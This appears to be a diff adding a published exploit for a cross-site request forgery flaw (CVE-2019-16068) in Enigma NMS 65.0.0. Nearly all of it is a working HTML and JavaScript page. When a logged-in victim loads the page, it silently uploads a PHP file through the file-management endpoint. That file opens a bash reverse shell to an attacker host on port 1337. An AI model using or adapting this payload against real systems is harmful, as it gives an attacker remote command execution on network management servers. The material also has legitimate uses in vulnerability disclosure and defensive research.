@@ -1,0 +1,69 @@
+#--------------------------------------------------------------------#
+# Exploit Title: Enigma NMS Cross-Site Request Forgery (CSRF)        #
+# Date:  21 July 2019                                                #
+# Author: Mark Cross (@xerubus | mogozobo.com)                       #
+# Vendor: NETSAS Pty Ltd                                             #
+# Vendor Homepage:  https://www.netsas.com.au/                       #
+# Software Link: https://www.netsas.com.au/enigma-nms-introduction/  #
+# Version: Enigma NMS 65.0.0                                         #
+# CVE-IDs: CVE-2019-16068                                            #   
+# Full write-up: https://www.mogozobo.com/?p=3647                    #
+#--------------------------------------------------------------------#
+        _  _
+  ___ (~ )( ~)
+ /   \_\ \/ /   
+|   D_ ]\ \/        -= Enigma CSRF by @xerubus =-       
+|   D _]/\ \     -= We all have something to hide =-
+ \___/ / /\ \\
+      (_ )( _)
+      @Xerubus    
+
+The following CSRF will create a PHP file for executing a reverse shell on port 1337 via the user upload functionality within the NMS web application.
+
+<html>
+  <script>history.pushState('', '', '/')</script>
+  <script>
+    function submitRequest()
+    {
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", "http:\/\/<enigma_nms_ipaddr>\/cgi-bin\/protected\/manage_files.cgi", true);
+      xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
+      xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+      xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------208051173310446317141640314495");
+      xhr.withCredentials = true;
+
+      var body = "-----------------------------208051173310446317141640314495\r\n" + 
+        "Content-Disposition: form-data; name=\"action\"\r\n" + 
+        "\r\n" + 
+        "system_upgrade\r\n" + 
+        "-----------------------------208051173310446317141640314495\r\n" + 
+        "Content-Disposition: form-data; name=\"action_aux\"\r\n" + 
+        "\r\n" + 
+        "upload_file_complete\r\n" + 
+        "-----------------------------208051173310446317141640314495\r\n" + 
+        "Content-Disposition: form-data; name=\"upfile\"; filename=\"evil.php\"\r\n" + 
+        "Content-Type: application/x-php\r\n" + 
+        "\r\n" + 
+        "\x3c?php\n" + 
+        "\n" + 
+        "exec(\"/bin/bash -c \'bash -i \x3e& /dev/tcp/<attacking_host_ipaddr>/1337 0\x3e&1\'\");\n" + 
+        "\n" + 
+        "?\x3e\n" + 
+        "\r\n" + 
+        "-----------------------------208051173310446317141640314495\r\n" + 
+        "Content-Disposition: form-data; name=\"upfile_name\"\r\n" + 
+        "\r\n" + 
+        "evil.php\r\n" + 
+        "-----------------------------208051173310446317141640314495--\r\n";
+
+      var aBody = new Uint8Array(body.length);
+      for (var i = 0; i < aBody.length; i++)
+        aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+    }
+    submitRequest();
+    window.location='http://<enigma_nms_ipaddr>/cgi-bin/protected/discover_and_manage.cgi?action=snmp_browser';
+  </script>
+  <body onload="submitRequest();" >
+  </body>
+</html>
